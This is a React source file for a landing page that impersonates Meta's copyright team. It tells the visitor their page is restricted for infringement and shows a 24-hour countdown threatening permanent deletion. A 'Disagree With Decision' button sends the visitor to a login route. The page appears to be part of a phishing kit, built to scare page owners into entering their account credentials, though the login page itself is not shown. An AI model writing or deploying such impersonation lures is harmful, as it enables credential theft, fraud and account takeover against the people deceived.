import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";

function Landing() {
  const [date, setDate] = useState("");
  const [timeLeft, setTimeLeft] = useState(0);
  const navigate = useNavigate();

  useEffect(() => {
    const today = new Date();
    const options = { year: "numeric", month: "long", day: "numeric" };
    setDate(today.toLocaleDateString(undefined, options));
  }, []);

  useEffect(() => {
    let deadline = localStorage.getItem("deadline");

    if (!deadline) {
      deadline = new Date().getTime() + 24 * 60 * 60 * 1000;
      localStorage.setItem("deadline", deadline);
    }

    const updateTimer = () => {
      const now = new Date().getTime();
      const diff = Math.max(0, Math.floor((deadline - now) / 1000)); // còn lại (giây)
      setTimeLeft(diff);
    };

    updateTimer(); 
    const timer = setInterval(updateTimer, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => {
    const h = String(Math.floor(seconds / 3600)).padStart(2, "0");
    const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, "0");
    const s = String(seconds % 60).padStart(2, "0");
    return `${h}:${m}:${s}`;
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100 p-4">
      <div className="bg-white w-full max-w-lg md:max-w-2xl rounded-xl shadow-lg p-6 sm:p-8 md:p-10 text-center">
        {/* Logo */}
        <img
          src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png"
          alt="Meta Logo"
          className="w-12 sm:w-14 md:w-16 mx-auto mb-4"
        />

        {/* Title */}
        <div className="flex items-center justify-center gap-2 mb-6">
          <h1 className="text-xl sm:text-xl md:text-xl font-bold">
            Meta Copyrights Team
          </h1>
          <img
            src="https://torro.io/hs-fs/hubfs/Meta-Verified-Packages-Checkmark.png"
            alt="Verification"
            className="h-4 sm:h-5 md:h-6"
          />
        </div>

        {/* Alert Box */}
        <div className="bg-gray-100 p-4 sm:p-5 rounded-lg mb-6">
          <p className="text-md sm:text-md font-bold">
            ⚠️ Your page is temporarily restricted.
          </p>
          <p className="text-sm sm:text-base mt-2">
            Our system has detected that your website may be infringing on third party images or videos.
          </p>
          <p className="text-xs sm:text-sm text-gray-500 mt-3">
            Suspended on {date}
          </p>
        </div>

        {/* Button */}
        <button
          onClick={() => {
            navigate("/login");
          }}
          className="mb-3 block w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 sm:py-4 rounded-lg mt-8 transition text-sm sm:text-base"
        >
          Disagree With Decision
        </button>

        {/* Sections */}
        <div className="text-left space-y-6">
          <div>
            <h3 className="text-base sm:text-lg font-semibold mb-2">
              What you can do
            </h3>
            <p className="text-sm sm:text-base leading-relaxed">
              You have{" "}
              <span className="font-bold text-red-600">
                {formatTime(timeLeft)}
              </span>{" "}
              left to disagree with our decision. If we do not receive appeal information from you, your page and related assets will be permanently deleted.

            </p>
          </div>

          <div>
            <h3 className="text-base sm:text-lg font-semibold mb-2">
              Why this happened
            </h3>
            <p className="text-sm sm:text-base leading-relaxed">
              Your page has been flagged for deletion due to suspected trademark
              infringement. Using a false identity doesn't follow our{" "}
              <a href="#" className="text-blue-600 underline">
                Terms
              </a>{" "}
              and{" "}
              <a href="#" className="text-blue-600 underline">
                Community Standards
              </a>
              .
            </p>
          </div>
        </div>

        {/* Footer */}
        <p className="text-xs sm:text-sm text-gray-500 mt-6 text-center">
          from <strong>Meta</strong> <br />
          Meta Terms of Service Team © {new Date().getFullYear()} Inc.
        </p>
      </div>
    </div>
  );
}

export default Landing;
